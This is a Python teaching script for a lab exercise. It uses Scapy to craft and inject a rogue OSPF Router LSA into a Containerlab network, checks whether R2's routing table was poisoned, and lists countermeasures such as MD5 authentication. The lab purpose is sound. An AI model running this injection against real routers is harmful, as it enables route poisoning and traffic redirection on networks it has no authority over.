#!/usr/bin/env python3
"""
ospf_security_sim.py
Cybersecurity Module — OSPF Rogue LSA Injection Simulation
Author: Adrian S. Obungu

Demonstrates a controlled OSPF attack scenario within the isolated
Containerlab environment. This script crafts a rogue OSPF LSA packet
using Scapy and injects it onto the transit link, simulating what an
attacker would do to poison a router's LSDB and redirect traffic.

The script then verifies whether the attack was successful by checking
R2's routing table for the injected route. This demonstrates:

    1. How OSPF trusts any speaker on the same segment (no auth by default)
    2. Why MD5/SHA authentication on OSPF interfaces is critical
    3. How to detect rogue LSAs by monitoring LSDB changes

IMPORTANT: This script is for EDUCATIONAL USE ONLY within an isolated
lab environment. Never run this on production networks.

Usage:
    # Run the full attack simulation and detection cycle
    sudo python3 scripts/ospf_security_sim.py

    # Dry-run mode — craft the packet but do not inject
    sudo python3 scripts/ospf_security_sim.py --dry-run

Requirements:
    pip3 install scapy rich
"""

import argparse
import subprocess
import sys
import time

try:
    from scapy.all import (
        IP, OSPF_Hdr, OSPF_LSUpd, OSPF_Router_LSA,
        OSPF_Link, sendp, Ether, conf
    )
except ImportError:
    print("Error: scapy not installed. Run: pip3 install scapy")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    RICH = True
except ImportError:
    RICH = False

# Attack parameters
ROGUE_NETWORK = "10.10.10.0/24"
ROGUE_ROUTER_ID = "6.6.6.6"
TARGET_MULTICAST = "224.0.0.5"
OSPF_AREA = "0.0.0.0"


def run_cmd(container: str, cmd: str) -> str:
    """Execute a command inside a Containerlab container."""
    try:
        result = subprocess.run(
            ["docker", "exec", container, "sh", "-c", cmd],
            capture_output=True, text=True, timeout=10
        )
        return result.stdout.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return ""


def check_pre_attack_state() -> dict:
    """Capture the routing table state before the attack."""
    r2_routes = run_cmd("clab-ospf-lab-R2", "vtysh -c 'show ip route ospf'")
    r1_routes = run_cmd("clab-ospf-lab-R1", "vtysh -c 'show ip route ospf'")
    r2_lsdb = run_cmd("clab-ospf-lab-R2", "vtysh -c 'show ip ospf database'")
    return {
        "r1_routes": r1_routes,
        "r2_routes": r2_routes,
        "r2_lsdb": r2_lsdb,
        "rogue_present_r2": ROGUE_NETWORK.split("/")[0] in r2_routes
    }


def craft_rogue_lsa() -> bytes:
    """
    Craft a rogue OSPF Router LSA advertising a fake network.

    In a real attack, this would be a Type-1 Router LSA with a
    higher sequence number than the legitimate LSA, causing the
    target router to prefer the attacker's route.
    """
    # Build the OSPF LSA Update packet
    pkt = (
        Ether(dst="01:00:5e:00:00:05") /
        IP(src="10.0.1.100", dst=TARGET_MULTICAST, proto=89) /
        OSPF_Hdr(
            version=2,
            type=4,  # LSU
            src=ROGUE_ROUTER_ID,
            area=OSPF_AREA
        ) /
        OSPF_LSUpd(
            lsacount=1,
            lsalist=[
                OSPF_Router_LSA(
                    type=1,
                    id=ROGUE_ROUTER_ID,
                    adrouter=ROGUE_ROUTER_ID,
                    seq=0x80000002,
                    linkcount=1,
                    linklist=[
                        OSPF_Link(
                            id="10.10.10.0",
                            data="255.255.255.0",
                            type=3,  # Stub network
                            metric=1
                        )
                    ]
                )
            ]
        )
    )
    return pkt


def check_post_attack_state() -> dict:
    """Check whether the rogue route appeared in the LSDB or routing table."""
    time.sleep(3)  # Allow SPF recalculation
    r2_routes = run_cmd("clab-ospf-lab-R2", "vtysh -c 'show ip route ospf'")
    r2_lsdb = run_cmd("clab-ospf-lab-R2", "vtysh -c 'show ip ospf database'")
    return {
        "r2_routes": r2_routes,
        "r2_lsdb": r2_lsdb,
        "rogue_in_routes": ROGUE_NETWORK.split("/")[0] in r2_routes,
        "rogue_in_lsdb": ROGUE_ROUTER_ID in r2_lsdb
    }


def display_simulation(pre: dict, post: dict, dry_run: bool) -> None:
    """Display the attack simulation results."""
    if RICH:
        console = Console()
        console.print(Panel(
            "[bold red]OSPF Rogue LSA Injection Simulation[/bold red]\n"
            f"Rogue Network: {ROGUE_NETWORK}\n"
            f"Rogue Router ID: {ROGUE_ROUTER_ID}\n"
            f"Mode: {'DRY RUN (packet crafted, not sent)' if dry_run else 'LIVE INJECTION'}",
            title="Security Simulation",
            border_style="red"
        ))

        table = Table(title="Attack Results", show_lines=True)
        table.add_column("Check", style="bold", min_width=40)
        table.add_column("Pre-Attack", justify="center", min_width=15)
        table.add_column("Post-Attack", justify="center", min_width=15)

        table.add_row(
            f"Rogue network ({ROGUE_NETWORK}) in R2 routes",
            "[green]Absent[/green]" if not pre["rogue_present_r2"] else "[red]Present[/red]",
            "[red]Present — ATTACK SUCCEEDED[/red]" if post["rogue_in_routes"]
            else "[green]Absent — Attack mitigated[/green]"
        )
        table.add_row(
            f"Rogue Router ID ({ROGUE_ROUTER_ID}) in LSDB",
            "[green]Absent[/green]",
            "[red]Present[/red]" if post["rogue_in_lsdb"]
            else "[green]Absent[/green]"
        )

        console.print(table)

        # Defensive recommendations
        console.print("\n[bold]Defensive Countermeasures:[/bold]")
        console.print("  1. Enable OSPF MD5 authentication on all interfaces:")
        console.print("     [dim]interface eth1[/dim]")
        console.print("     [dim]  ip ospf authentication message-digest[/dim]")
        console.print("     [dim]  ip ospf message-digest-key 1 md5 <secret>[/dim]")
        console.print("  2. Configure OSPF passive-interface on all non-transit links")
        console.print("  3. Implement LSDB change monitoring (SNMP traps or script-based)")
        console.print("  4. Use IPsec for OSPF over untrusted segments")
        console.print("")

        if not post["rogue_in_routes"] and not dry_run:
            console.print("[yellow]Note: Modern FRR versions may reject malformed LSAs.[/yellow]")
            console.print("[yellow]This demonstrates the attack vector — real-world success[/yellow]")
            console.print("[yellow]depends on sequence number manipulation and timing.[/yellow]")

    else:
        print(f"\nOSPF Security Simulation Results")
        print(f"  Rogue network in R2 routes (pre):  {'Yes' if pre['rogue_present_r2'] else 'No'}")
        print(f"  Rogue network in R2 routes (post): {'Yes' if post['rogue_in_routes'] else 'No'}")
        print(f"  Rogue RID in LSDB (post):          {'Yes' if post['rogue_in_lsdb'] else 'No'}")


def main():
    parser = argparse.ArgumentParser(
        description="OSPF Rogue LSA Injection Simulation (educational)"
    )
    parser.add_argument("--dry-run", action="store_true",
                        help="Craft the packet but do not inject it")
    args = parser.parse_args()

    if RICH:
        console = Console()
        console.print("\n[bold]Phase 1: Capturing pre-attack baseline...[/bold]")
    else:
        print("\nPhase 1: Capturing pre-attack baseline...")

    pre = check_pre_attack_state()

    if RICH:
        console.print("[bold]Phase 2: Crafting rogue LSA packet...[/bold]")
    else:
        print("Phase 2: Crafting rogue LSA packet...")

    rogue_pkt = craft_rogue_lsa()

    if args.dry_run:
        if RICH:
            console.print("[yellow]DRY RUN — Packet crafted but not injected.[/yellow]")
            console.print(f"[dim]Packet summary: {rogue_pkt.summary()}[/dim]")
        else:
            print(f"DRY RUN — Packet: {rogue_pkt.summary()}")
        post = {"rogue_in_routes": False, "rogue_in_lsdb": False, "r2_routes": "", "r2_lsdb": ""}
    else:
        if RICH:
            console.print("[bold]Phase 3: Injecting rogue LSA onto transit link...[/bold]")
        else:
            print("Phase 3: Injecting rogue LSA...")

        conf.verb = 0
        try:
            sendp(rogue_pkt, verbose=False)
        except Exception as e:
            print(f"Injection failed (expected in some environments): {e}")

        if RICH:
            console.print("[bold]Phase 4: Checking post-attack state...[/bold]")
        else:
            print("Phase 4: Checking post-attack state...")

        post = check_post_attack_state()

    display_simulation(pre, post, args.dry_run)


if __name__ == "__main__":
    main()
